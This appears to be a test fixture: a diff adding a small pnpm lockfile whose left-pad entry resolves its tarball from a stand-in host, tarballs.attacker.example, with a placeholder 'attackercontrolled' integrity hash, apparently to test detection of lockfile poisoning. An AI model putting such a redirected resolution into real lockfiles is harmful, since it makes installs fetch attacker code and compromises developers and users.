@@ -1,0 +1,22 @@
+lockfileVersion: '9.0'
+
+importers:
+  .:
+    dependencies:
+      left-pad:
+        specifier: ^1.3.0
+        version: 1.3.0
+
+packages:
+
+  left-pad@1.3.0:
+    resolution: {integrity: sha512-attackercontrolled, tarball: https://tarballs.attacker.example/left-pad-1.3.0.tgz}
+
+  '@scope/util@2.0.0':
+    resolution: {integrity: sha512-fixture}
+
+snapshots:
+
+  left-pad@1.3.0: {}
+
+  '@scope/util@2.0.0': {}
